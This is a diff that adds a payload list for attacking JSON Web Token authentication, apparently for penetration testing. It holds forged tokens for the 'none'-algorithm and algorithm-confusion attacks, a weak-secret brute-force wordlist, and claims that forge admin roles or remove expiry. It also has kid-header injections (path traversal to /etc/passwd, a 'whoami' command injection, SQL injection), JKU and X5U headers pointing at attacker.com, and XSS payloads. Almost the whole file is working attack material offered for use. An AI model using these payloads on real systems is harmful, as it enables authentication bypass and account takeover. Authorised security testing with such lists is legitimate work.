@@ -1,0 +1,259 @@
+# JWT Vulnerabilities Payloads
+
+# None Algorithm Attack
+# Change alg to "none" and remove signature
+# Original: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCJ9.signature
+# Modified: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
+
+# Header: {"alg":"none","typ":"JWT"}
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
+
+# Header: {"alg":"None","typ":"JWT"}
+eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
+
+# Header: {"alg":"NONE","typ":"JWT"}
+eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
+
+# Header: {"alg":"nOnE","typ":"JWT"}
+eyJhbGciOiJuT25FIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
+
+# Algorithm Confusion Attack (RS256 to HS256)
+# Change algorithm from RS256 to HS256 and sign with public key
+# Header: {"alg":"HS256","typ":"JWT"}
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature_here
+
+# Weak Secret Brute Force
+# Common weak secrets to test
+secret
+password
+123456
+12345678
+admin
+test
+jwt
+key
+default
+secret123
+password123
+qwerty
+abc123
+letmein
+changeme
+welcome
+monkey
+12345
+iloveyou
+trustno1
+dragon
+
+# Modified Claims - Privilege Escalation
+# Payload: {"user":"admin"}
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.
+
+# Payload: {"role":"admin"}
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.
+
+# Payload: {"admin":true}
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6dHJ1ZX0.
+
+# Payload: {"isAdmin":true}
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc0FkbWluIjp0cnVlfQ.
+
+# Payload: {"permissions":["admin","read","write","delete"]}
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwZXJtaXNzaW9ucyI6WyJhZG1pbiIsInJlYWQiLCJ3cml0ZSIsImRlbGV0ZSJdfQ.
+
+# User ID Manipulation
+# Payload: {"userId":1}
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjF9.
+
+# Payload: {"sub":"1"}
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIn0.
+
+# Payload: {"id":1}
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MX0.
+
+# Token Expiration Bypass
+# Payload: {"exp":9999999999}
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjk5OTk5OTk5OTl9.
+
+# Payload: No exp field
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.
+
+# Payload: {"exp":null}
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOm51bGx9.
+
+# JWK Header Injection
+# Header: {"alg":"RS256","typ":"JWT","jwk":{"kty":"RSA","kid":"key1","n":"...","e":"AQAB"}}
+eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImp3ayI6eyJrdHkiOiJSU0EiLCJraWQiOiJrZXkxIiwibiI6Ii4uLiIsImUiOiJBUUFCIn19.payload.signature
+
+# Kid Parameter Injection
+# Header: {"alg":"HS256","typ":"JWT","kid":"../../public.key"}
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uL3B1YmxpYy5rZXkifQ.payload.signature
+
+# Header: {"alg":"HS256","typ":"JWT","kid":"/dev/null"}
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii9kZXYvbnVsbCJ9.payload.signature
+
+# Header: {"alg":"HS256","typ":"JWT","kid":"../../../dev/null"}
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uL2Rldi9udWxsIn0.payload.signature
+
+# SQL Injection in Claims
+# Payload: {"username":"admin' OR '1'='1"}
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluJyBPUiAnMSc9JzEifQ.
+
+# Payload: {"user":"admin'--"}
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4nLS0ifQ.
+
+# XSS in Claims
+# Payload: {"name":"<script>alert(1)</script>"}
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiPHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0PiJ9.
+
+# Payload: {"comment":"<img src=x onerror=alert(1)>"}
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjb21tZW50IjoiPGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPiJ9.
+
+# Empty Signature
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.
+
+# Invalid Signature
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.invalid
+
+# JKU Header Injection (JWK Set URL)
+# Header: {"alg":"RS256","typ":"JWT","jku":"https://attacker.com/jwks.json"}
+eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHBzOi8vYXR0YWNrZXIuY29tL2p3a3MuanNvbiJ9.payload.signature
+
+# X5U Header Injection (X.509 URL)
+# Header: {"alg":"RS256","typ":"JWT","x5u":"https://attacker.com/cert.pem"}
+eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsIng1dSI6Imh0dHBzOi8vYXR0YWNrZXIuY29tL2NlcnQucGVtIn0.payload.signature
+
+# X5C Header Injection (X.509 Certificate Chain)
+# Header: {"alg":"RS256","typ":"JWT","x5c":["MIIC..."]}
+eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsIng1YyI6WyJNSUlDLi4uIl19.payload.signature
+
+# Critical Header Parameter Bypass
+# Header: {"alg":"HS256","typ":"JWT","crit":["exp"],"exp":9999999999}
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImNyaXQiOlsiZXhwIl0sImV4cCI6OTk5OTk5OTk5OX0.payload.signature
+
+# Type Confusion
+# Header: {"alg":"HS256","typ":"JWE"}
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXRSJ9.payload.signature
+
+# Null Byte Injection in Kid
+# Header: {"alg":"HS256","typ":"JWT","kid":"key\u0000admin"}
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImtleVx1MDAwMGFkbWluIn0.payload.signature
+
+# Command Injection in Kid
+# Header: {"alg":"HS256","typ":"JWT","kid":"key; whoami"}
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImtleTsgd2hvYW1pIn0.payload.signature
+
+# Path Traversal in Kid
+# Header: {"alg":"HS256","typ":"JWT","kid":"../../../../etc/passwd"}
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uLy4uL2V0Yy9wYXNzd2QifQ.payload.signature
+
+# SQL Injection in Kid
+# Header: {"alg":"HS256","typ":"JWT","kid":"key' OR '1'='1"}
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImtleScgT1IgJzEnPScxIn0.payload.signature
+
+# Audience Manipulation
+# Payload: {"aud":"admin-api"}
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJhZG1pbi1hcGkifQ.
+
+# Payload: {"aud":["admin","user","guest"]}
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOlsiYWRtaW4iLCJ1c2VyIiwiZ3Vlc3QiXX0.
+
+# Issuer Manipulation
+# Payload: {"iss":"trusted-issuer"}
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ0cnVzdGVkLWlzc3VlciJ9.
+
+# Not Before (nbf) Bypass
+# Payload: {"nbf":0}
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYmYiOjB9.
+
+# JWT ID (jti) Manipulation
+# Payload: {"jti":"admin-token-123"}
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOiJhZG1pbi10b2tlbi0xMjMifQ.
+
+# Scope Escalation
+# Payload: {"scope":"admin read write delete"}
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzY29wZSI6ImFkbWluIHJlYWQgd3JpdGUgZGVsZXRlIn0.
+
+# Custom Claims Injection
+# Payload: {"custom_role":"superadmin"}
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjdXN0b21fcm9sZSI6InN1cGVyYWRtaW4ifQ.
+
+# Payload: {"groups":["admin","developers","security"]}
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJncm91cHMiOlsiYWRtaW4iLCJkZXZlbG9wZXJzIiwic2VjdXJpdHkiXX0.
+
+# Numeric Value Manipulation
+# Payload: {"level":999}
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZXZlbCI6OTk5fQ.
+
+# Payload: {"credit":999999}
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjcmVkaXQiOjk5OTk5OX0.
+
+# Boolean Manipulation
+# Payload: {"verified":true}
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ2ZXJpZmllZCI6dHJ1ZX0.
+
+# Payload: {"premium":true}
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwcmVtaXVtIjp0cnVlfQ.
+
+# Array Injection
+# Payload: {"roles":["admin","superuser","root"]}
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlcyI6WyJhZG1pbiIsInN1cGVydXNlciIsInJvb3QiXX0.
+
+# Null Value Injection
+# Payload: {"userId":null}
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOm51bGx9.
+
+# Negative Values
+# Payload: {"userId":-1}
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOi0xfQ.
+
+# Large Numbers
+# Payload: {"userId":2147483647}
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIxNDc0ODM2NDd9.
+
+# Unicode Injection
+# Payload: {"user":"admin\u0000"}
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW5cdTAwMDAifQ.
+
+# Base64 URL Encoding Issues
+# Missing padding
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature
+
+# Extra padding
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9==.eyJ1c2VyIjoiYWRtaW4ifQ==.signature==
+
+# Standard base64 instead of base64url
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9+.eyJ1c2VyIjoiYWRtaW4ifQ/.signature+
+
+# JWT Confusion with Session Tokens
+# Use JWT where session token expected
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.
+
+# Empty JWT
+..
+
+# Malformed JWT
+malformed.jwt.token
+header.payload
+.payload.signature
+header..signature
+
+# JWT in URL
+https://target.com/api?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature
+
+# JWT in Cookie
+Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature
+
+# Multiple JWTs
+Authorization: Bearer jwt1, Bearer jwt2
+
+# JWT with extra segments
+header.payload.signature.extra
+
+# Case-sensitive Algorithm
+# Header: {"alg":"hs256","typ":"JWT"}
+eyJhbGciOiJoczI1NiIsInR5cCI6IkpXVCJ9.payload.signature
+
+# Header: {"alg":"Hs256","typ":"JWT"}
+eyJhbGciOiJIczI1NiIsInR5cCI6IkpXVCJ9.payload.signature
